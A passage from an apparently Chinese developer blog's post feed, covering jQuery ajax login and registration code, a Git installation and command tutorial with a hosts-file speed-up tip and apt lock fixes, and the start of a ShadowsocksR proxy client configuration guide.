punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> msg <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> $test <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string">'/login/'</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//指定请求的数据格式为json</span>            contentType<span class="token punctuation">:</span><span class="token string">'application/json'</span><span class="token punctuation">,</span>            data<span class="token punctuation">:</span>msg<span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//指定响应的格式为json,注意如果后台没有放回json类型的数据格式下方的success不会执行</span>            dataType<span class="token punctuation">:</span><span class="token string">'json'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>                data <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    $test<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'登录失败!'</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'https://www.baidu.com/'</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="ajax提交注册"><a href="#ajax提交注册" class="headerlink" title="ajax提交注册"></a>ajax提交注册</h3><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#btn_submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 生成提交对象</span>        <span class="token keyword">let</span> form_data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> sub <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#form_reg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">serializeArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span>sub<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>            form_data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span>name<span class="token punctuation">,</span> val<span class="token punctuation">.</span>value<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        form_data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"myfile"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#up_myhead"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'留空1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span> <span class="token string">"/register/"</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span> <span class="token string">"post"</span><span class="token punctuation">,</span>            contentType<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//告诉jQuery不要去设置Content-Type请求头</span>            processData<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//告诉jQuery不要去处理发送的数据</span>            data<span class="token punctuation">:</span> form_data<span class="token punctuation">,</span>            success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/login/'</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    $<span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#id_"</span> <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"has-error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 提示两次密码不一致</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token string">"__all__"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#id_re_pwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"has-error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 三秒后清除错误提示和error效果</span>                    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">let</span> form <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".form-group"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        form<span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">"has-error"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">children</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        form<span class="token punctuation">.</span><span class="token function">children</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ajax </tag>
            
            <tag> JavaScript </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git安装,国内加速,使用技巧,常用命令</title>
      <link href="/posts/5544.html"/>
      <url>/posts/5544.html</url>
      
        <content type="html"><![CDATA[<h1 id="Git”捡shi”（这可能是一段废话）"><a href="#Git”捡shi”（这可能是一段废话）" class="headerlink" title="Git”捡shi”（这可能是一段废话）"></a>Git”捡shi”（这可能是一段废话）</h1><blockquote><p>同生活中的许多伟大事物一样，Git 诞生于一个极富纷争大举创新的年代。<br>Linux 内核开源项目有着为数众多的参与者。 绝大多数的 Linux 内核维护工作都花在了提交补丁和保存归档的繁琐事务上（1991－2002年间）。 到 2002 年，整个项目组开始启用一个专有的分布式版本控制系统 BitKeeper 来管理和维护代码。<br>到了 2005 年，开发 BitKeeper 的商业公司同 Linux 内核开源社区的合作关系结束，他们收回了 Linux 内核社区免费使用 BitKeeper 的权力。 这就迫使 Linux 开源社区（特别是 Linux 的缔造者 Linus Torvalds）基于使用 BitKeeper 时的经验教训，开发出自己的版本系统。 </p></blockquote><p><strong>他们对新的系统制订了若干目标：</strong></p><ul><li><p>速度</p></li><li><p>简单的设计</p></li><li><p>对非线性开发模式的强力支持（允许成千上万个并行开发的分支）</p></li><li><p>完全分布式</p></li><li><p>有能力高效管理类似 Linux 内核一样的超大规模项目（速度和数据量）</p></li><li><p>自诞生于 2005 年以来，Git 日臻成熟完善，在高度易用的同时，仍然保留着初期设定的目标。 它的速度飞快，极其适合管理大项目，有着令人难以置信的非线性分支管理系统（参见 Git 分支）。</p><p>总结一句：<strong>伟大的分布式版本控制系统</strong></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/6666.png" alt="6666"></p></li></ul><p> <strong>那么牛皮还是跨平台的,那就看看怎么安装的</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E5%B0%8F%E8%80%81%E5%BC%9F%E5%BE%80%E5%90%8E%E7%A8%8D%E7%A8%8D.gif" alt="小老弟往后稍稍"></p><h1 id="Linux下安装"><a href="#Linux下安装" class="headerlink" title="Linux下安装"></a>Linux下安装</h1><h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><p> <strong>先看下你Linux机器中有没有git,如果有-就别看我zb了</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943133502.png" alt="检测是否存在git"></p><p> <strong>没有存在的话就开始安装，安装的话有几种方式，这里就用最最最最简单的（centos系统）</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943239950.png" alt="如果有提示就按Y"></p><p> <strong>输入命令</strong><br> <code>git --version</code></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943332708.png" alt="版本信息"></p><p> <strong>要是不想秀git了</strong><br> <code>yum remove git</code> 移除默认安装</p><h3 id="设置git"><a href="#设置git" class="headerlink" title="设置git"></a>设置git</h3><pre><code>git config --global user.name &quot;你的用户名，例如github的账号&quot;git config --global user.email &quot;你的邮箱，例如github中的邮件地址&quot;git config --list`来查看设置的信息</code></pre><h1 id="Windows下安装Git"><a href="#Windows下安装Git" class="headerlink" title="Windows下安装Git"></a>Windows下安装Git</h1><h2 id="下载Git管理工具"><a href="#下载Git管理工具" class="headerlink" title="下载Git管理工具"></a>下载Git管理工具</h2><p> <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">点我加入py大家庭</a></p><h2 id="欢迎加入"><a href="#欢迎加入" class="headerlink" title="欢迎加入"></a>欢迎加入</h2><p><strong>下载完成安装之后打开</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944685133.png" alt="Git Bash"></p><h2 id="设置git-1"><a href="#设置git-1" class="headerlink" title="设置git"></a>设置git</h2><pre><code>git config --global user.name &quot;你的用户名，例如github的账号&quot;git config --global user.email &quot;你的邮箱，例如github中的邮件地址&quot;git config --list`来查看设置的信息</code></pre><h2 id="恭喜你"><a href="#恭喜你" class="headerlink" title="恭喜你"></a>恭喜你</h2><p><strong>作为全球最大同性交友平台，集结了大量的女装大佬</strong> </p><p>赶紧来git上玩耍吧</p><h2 id="新建test仓库，把本地和远程库连接"><a href="#新建test仓库，把本地和远程库连接" class="headerlink" title="新建test仓库，把本地和远程库连接"></a>新建test仓库，把本地和远程库连接</h2><h3 id="新建远程仓库"><a href="#新建远程仓库" class="headerlink" title="新建远程仓库"></a>新建远程仓库</h3><p><strong>登录到GitHub</strong></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945051688.png" alt=" 点击New"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945181413.png" alt="就得这样啊"></p><h3 id="本地绑定"><a href="#本地绑定" class="headerlink" title="本地绑定"></a>本地绑定</h3><p><strong>在你的项目文件夹中</strong></p><pre><code>git init  #在当前项目的目录中生成本地的git管理</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945492291.png" alt="当前目录下多了一个.git文件夹"></p><pre class=" language-tex"><code class="language-tex">git add .将项目上所有的文件添加到仓库中的意思，如果想添加某个特定的文件，只需把.换成这个特定的文件名即可</code></pre><pre class=" language-tex"><code class="language-tex">git commit -m "first commit"` 对这次提交的注释</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945605584.png" alt="上面2步必需! "></p><h3 id="绑定到远程仓库"><a href="#绑定到远程仓库" class="headerlink" title="绑定到远程仓库"></a>绑定到远程仓库</h3><pre class=" language-tex"><code class="language-tex">git remote add origin 仓库地址</code></pre><h3 id="上传代码"><a href="#上传代码" class="headerlink" title="上传代码"></a>上传代码</h3><pre class=" language-tex"><code class="language-tex">git push -u origin master</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945972775.png" alt="绑定和上传"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946084300.png" alt="OK "></p><h2 id="新建分支（非必需）"><a href="#新建分支（非必需）" class="headerlink" title="新建分支（非必需）"></a>新建分支（非必需）</h2><h3 id="在本地创建dev分支-并推送到远程"><a href="#在本地创建dev分支-并推送到远程" class="headerlink" title="在本地创建dev分支, 并推送到远程"></a>在本地创建dev分支, 并推送到远程</h3><pre><code>git checkout -b devgit push origin dev</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946454974.png" alt="本地建立并上传"><br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946432782.png" alt="dev 分支"></p><h3 id="如果本地有修改"><a href="#如果本地有修改" class="headerlink" title="如果本地有修改"></a>如果本地有修改</h3><pre><code>git add .git commit -m &quot;xxx&quot;git push origin dev</code></pre><h3 id="新的同事-克隆仓库"><a href="#新的同事-克隆仓库" class="headerlink" title="新的同事: 克隆仓库"></a>新的同事: 克隆仓库</h3><pre><code>git clone urlgit checkout -b dev origin/devgit pull origin dev</code></pre><h3 id="如果远程修改"><a href="#如果远程修改" class="headerlink" title="如果远程修改"></a>如果远程修改</h3><pre><code>git pull origin dev</code></pre><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查看远程仓库地址"><a href="#查看远程仓库地址" class="headerlink" title="查看远程仓库地址"></a>查看远程仓库地址</h2><pre class=" language-tex"><code class="language-tex">git remote -v</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946176703.png" alt="git remote -v"></p><h2 id="分支操作："><a href="#分支操作：" class="headerlink" title="分支操作："></a>分支操作：</h2><pre><code>git branch 创建分支git branch -b 创建并切换到新建的分支上git checkout 切换分支git branch 查看分支列表git branch -v 查看所有分支的最后一次操作git branch -vv 查看当前分支git brabch -b 分支名 origin/分支名 创建远程分支到本地git branch --merged 查看别的分支和当前分支合并过的分支git branch --no-merged 查看未与当前分支合并的分支git branch -d 分支名 删除本地分支git branch -D 分支名 强行删除分支git branch origin :分支名 删除远处仓库分支git merge 分支名 合并分支到当前分支上</code></pre><h2 id="暂存操作："><a href="#暂存操作：" class="headerlink" title="暂存操作："></a>暂存操作：</h2><pre><code>git stash 暂存当前修改git stash apply 恢复最近的一次暂存git stash pop 恢复暂存并删除暂存记录git stash list 查看暂存列表git stash drop 暂存名(例：stash@{0}) 移除某次暂存git stash clear 清除暂存</code></pre><h2 id="回退操作"><a href="#回退操作" class="headerlink" title="回退操作"></a>回退操作</h2><pre><code>git reset --hard HEAD^ 回退到上一个版本git reset --hard ahdhs1(commit_id) 回退到某个版本git checkout -- file撤销修改的文件(如果文件加入到了暂存区，则回退到暂存区的，如果文件加入到了版本库，则还原至加入版本库之后的状态)git reset HEAD file 撤回暂存区的文件修改到工作区</code></pre><h2 id="标签操作："><a href="#标签操作：" class="headerlink" title="标签操作："></a>标签操作：</h2><pre><code>git tag 标签名 添加标签(默认对当前版本)git tag 标签名 commit_id 对某一提交记录打标签git tag -a 标签名 -m &#39;描述&#39; 创建新标签并增加备注git tag 列出所有标签列表git show 标签名 查看标签信息git tag -d 标签名 删除本地标签git push origin 标签名 推送标签到远程仓库git push origin --tags 推送所有标签到远程仓库git push origin :refs/tags/标签名 从远程仓库中删除标签</code></pre><h2 id="常规操作："><a href="#常规操作：" class="headerlink" title="常规操作："></a>常规操作：</h2><pre><code>git push origin test 推送本地分支到远程仓库git rm -r --cached 文件/文件夹名字 取消文件被版本控制git reflog 获取执行过的命令git log --graph 查看分支合并图git merge --no-ff -m &#39;合并描述&#39; 分支名 不使用Fast forward方式合并，采用这种方式合并可以看到合并记录git check-ignore -v 文件名 查看忽略规则git add -f 文件名 强制将文件提交</code></pre><h1 id="加速加速"><a href="#加速加速" class="headerlink" title="加速加速"></a>加速加速</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 通过解析dns，直接访问GitHub的cdn节点，你会编的话就多编点。。。</p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E8%A3%85%E9%80%BC%E8%99%BD%E5%A5%BD%EF%BC%8C%E4%BD%86%E4%B8%8D%E8%A6%81%E8%B4%AA%E8%A3%85%E5%93%A6.png" alt="装逼虽好，但不要贪装哦"></p><h2 id="动手吧"><a href="#动手吧" class="headerlink" title="动手吧"></a>动手吧</h2><p> 查询dns解析：<br><a href="https://tool.chinaz.com/dns" target="_blank" rel="noopener">站长之家</a></p><p><strong>把下面延迟小的记录下来</strong><br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943710260.png" alt="enter description here"></p><p><strong>然后去修改hosts文件</strong></p><pre class=" language-tex"><code class="language-tex">C:\Windows\System32\drivers\etc\</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943960607.png" alt="C:\Windows\System32\drivers\etc\hosts "></p><p><strong>这里修改的时候 一定要用管理员身份运行哦</strong><br><strong>这里修改的时候 一定要用管理员身份运行哦</strong><br><strong>这里修改的时候 一定要用管理员身份运行哦</strong><br>↑↑↑</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944103112.png" alt="把刚刚记录延迟小的值使用这种方式保存进去"></p><h2 id="实在没听懂的话"><a href="#实在没听懂的话" class="headerlink" title="实在没听懂的话"></a>实在没听懂的话</h2><p><strong>这里可以借用火绒的工具去修改</strong><br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944231742.png" alt="enter description here"></p><h3 id="刷新系统DNS缓存"><a href="#刷新系统DNS缓存" class="headerlink" title="刷新系统DNS缓存"></a>刷新系统DNS缓存</h3><p><strong>cmd中</strong></p><pre><code>ipconfig /flushdns</code></pre><h1 id="不想变秃头-遇到的问题"><a href="#不想变秃头-遇到的问题" class="headerlink" title="不想变秃头~遇到的问题"></a>不想变秃头~遇到的问题</h1><h2 id="Linux安装Git、解决ubuntu-E-无法获得锁"><a href="#Linux安装Git、解决ubuntu-E-无法获得锁" class="headerlink" title="Linux安装Git、解决ubuntu   E: 无法获得锁"></a>Linux安装Git、解决ubuntu   E: 无法获得锁</h2><p>leesun@leesun:~$ sudo apt-get install git<br>E: 无法获得锁 /var/lib/dpkg/lock-frontend - open (11: 资源暂时不可用)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p><h3 id="解决方案一"><a href="#解决方案一" class="headerlink" title="解决方案一"></a>解决方案一</h3><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">ps</span> -e <span class="token operator">|</span> <span class="token function">grep</span> apt<span class="token function">sudo</span> <span class="token function">kill</span> 进程号</code></pre><h3 id="无法解决"><a href="#无法解决" class="headerlink" title="无法解决"></a>无法解决</h3><h3 id="解决方案二"><a href="#解决方案二" class="headerlink" title="解决方案二"></a>解决方案二</h3><pre class=" language-crystal"><code class="language-crystal"><span class="token number">1</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span>cache<span class="token operator">/</span>apt<span class="token operator">/</span>archives<span class="token operator">/</span>lock<span class="token number">2</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span><span class="token keyword">lib</span><span class="token operator">/</span>dpkg<span class="token operator">/</span>lock<span class="token number">3</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span>cache<span class="token operator">/</span>apt<span class="token operator">/</span>archives<span class="token operator">/</span>lock<span class="token number">4</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span><span class="token keyword">lib</span><span class="token operator">/</span>dpkg<span class="token operator">/</span>lock<span class="token operator">-</span>frontend</code></pre><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944457531.png" alt="Linux安装Git、解决ubuntu   E: 无法获得锁  "></p><h2 id="rejected-master-gt-master-non-fast-forward"><a href="#rejected-master-gt-master-non-fast-forward" class="headerlink" title="[rejected]        master -&gt; master (non-fast-forward)"></a>[rejected]        master -&gt; master (non-fast-forward)</h2><h6 id="出现问题的原因："><a href="#出现问题的原因：" class="headerlink" title="出现问题的原因："></a>出现问题的原因：</h6><p>github中的有些文件不在本地代码目录中</p><h5 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h5><p><code>git pull --rebase origin master</code></p><h5 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h5><p>本地代码目录下出现gitHub中文件<br>此时 再执行以下操作 代码成功上传至github<br><code>git push -u origin master</code></p><h1 id="git使用的技巧"><a href="#git使用的技巧" class="headerlink" title="git使用的技巧"></a>git使用的技巧</h1><p><a href="https://blog.csdn.net/zcube/article/details/47841175" target="_blank" rel="noopener">用SourceTree轻松Git项目图解</a></p><p><a href="https://gitee.com/" target="_blank" rel="noopener">码云</a></p><p><a href="https://www.bootcss.com/p/git-guide/" target="_blank" rel="noopener">优秀的Git教程</a></p>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shadowsocks 使用配置</title>
      <link href="/posts/6d0d.html"/>
      <url>/posts/6d0d.html</url>
      
        <content type="html"><![CDATA[<h1 id="科学上网的那些事情"><a href="#科学上网的那些事情" class="headerlink" title="科学上网的那些事情"></a>科学上网的那些事情</h1><blockquote><p>XP默认并没有安装 .NET Framework v2.0和v4.0，需要手动安装。<br>Win7/8/10的系统一般都安装了 .NET Framework v2.0和v4.0 所以都能用。<br>MAC请选择：ShadowsocksX-R、ShadowsocksX-NG、GoAgentX-SSR.dmg（GoAgent的SSR插件）</p></blockquote><h2 id="托盘颜色"><a href="#托盘颜色" class="headerlink" title="托盘颜色"></a>托盘颜色</h2><ul><li>普通情况下，图标颜色为 深蓝色。</li><li>当你选择 系统代理模式 — PAC模式 的时候，图标颜色为 浅绿色。</li><li>当你选择 系统代理模式 — 全局模式 的时候，图标颜色为 浅蓝色(浅青色)。</li><li>当你启动 服务器负载均衡 功能的时候，图标颜色从 深蓝色 变为 粉红色。</li><li>当你启动 服务器负载均衡 功能并选择 系统代理模式 — PAC模式 的时候，图标颜色为 浅橙色。</li><li>当你启动 服务器负载均衡 功能并选择 系统代理模式 — 全局模式 的时候，图标颜色为 白色</li></ul><h2 id="鼠标操作"><a href="#鼠标操作" class="headerlink" title="鼠标操作"></a>鼠标操作</h2><h3 id="单独鼠标操作"><a href="#单独鼠标操作" class="headerlink" title="单独鼠标操作"></a>单独鼠标操作</h3><ul><li>鼠标左键单击/双击 托盘图标后，会弹出 编辑服务器 窗口。</li><li>鼠标中键单击 托盘图标后，会弹出 服务器连接统计 窗口。</li><li>鼠标右键单击 托盘图标后，会弹出 托盘菜单。</li><li><h3 id="键盘-鼠标操作"><a href="#键盘-鼠标操作" class="headerlink" title="键盘+鼠标操作"></a>键盘+鼠标操作</h3></li><li>按下 Shitf键，然后鼠标左键单击 托盘图标后，会弹出 选项设置 窗口。</li><li>按下 Ctrl键，然后鼠标左键单击 托盘图标后，会弹出 服务器连接统计 窗口。</li><li>按下 Alt键，然后鼠标左键单击 托盘图标后，会弹出 端口设置 窗口。</li></ul><h2 id="科学上网是不科学的"><a href="#科学上网是不科学的" class="headerlink" title="科学上网是不科学的~"></a>科学上网是不科学的~</h2><h2 id="Shadowsocks是否安全？"><a href="#Shadowsocks是否安全？" class="headerlink" title="Shadowsocks是否安全？"></a>Shadowsocks是否安全？</h2><p><strong>Shadowsocks是被设计来混淆数据，增加 墙 检查出流量特征所需的计算量，提高实时检测和匹配的成本，而不是加密。</strong></p><p>Shadowsocks是一个业余兴趣制作的项目，并没有经过严谨的密码学算法计算，Shadowsocks不是一个VPN，它无法100%的保护你的数据安全！</p><h1 id="教你怎么打开ShadowsocksR软件"><a href="#教你怎么打开ShadowsocksR软件" class="headerlink" title="教你怎么打开ShadowsocksR软件"></a>教你怎么打开ShadowsocksR软件</h1><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E7%AC%91%E8%AF%9D.png" alt="笑话"></p><h2 id="开启飞机"><a href="#开启飞机" class="headerlink" title="开启飞机"></a>开启飞机</h2><p><strong>将下载的ssr客户端解压出来</strong></p><p><em>如果是XP用户，请直接使用“dotnet2.0”版本</em></p><h3 id="打开程序"><a href="#打开程序" class="headerlink" title="打开程序"></a>打开程序</h3><p><strong>在任务栏处会有纸飞机样子的图标，那就是我们要操作的小飞机</strong></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584020167666.png" alt="右键服务器订阅 "></p><p><strong>把默认的订阅删除掉</strong></p><h1 id="系统代理模式介绍"><a href="#系统代理模式介绍" class="headerlink" title="系统代理模式介绍"></a>系统代理模式介绍</h1><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584020290877.png" alt="系统代理模式"></p><h2 id="直连模式"><a href="#直连模式" class="headerlink" title="直连模式"></a>直连模式</h2><blockquote><p>会关闭系统HTTP代理，你的所有HTTP上网流量都不会通过SSR代理，在此模式下你只能使用Socks5代理方式连接SSR代理</p></blockquote><h2 id="PAC模式"><a href="#PAC模式" class="headerlink" title="PAC模式"></a>PAC模式</h2><blockquote><p>会修改系统IE代理，使用PAC文件控制代理。PAC文件包含了规则列表，可以控制哪些流量走SSR，哪些不走（例如国内流量直连，国外走代理），做到智能代理。但是实际上此功能已经可以被“代理规则”设置完全代替（除非你一定要用gfwlist），因此一般不用这一模式。</p></blockquote><p><strong>PAC文件为SSR根目录下的pac.txt。</strong></p><h2 id="全局模式"><a href="#全局模式" class="headerlink" title="全局模式"></a>全局模式</h2><blockquote><p>会开启系统HTTP代理，你的所有HTTP上网流量将会通过SSR代理。</p></blockquote><h2 id="保持当前状态不修改"><a href="#保持当前状态不修改" class="headerlink" title="保持当前状态不修改"></a>保持当前状态不修改</h2><blockquote><p>不会对你目前的系统HTTP代理状态进行任何的修改</p></blockquote><h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><blockquote><p>PAC规则 是根据PAC文件中的黑白地址名单来判断那些网站走代理，也就是判断 流量数据是进入SSR客户端还是直连。</p></blockquote><p><strong>每个选项会执行什么操作、有什么效果，都在菜单中写的清清楚楚。</strong></p><h2 id="代理规则"><a href="#代理规则" class="headerlink" title="代理规则"></a>代理规则</h2><p><img 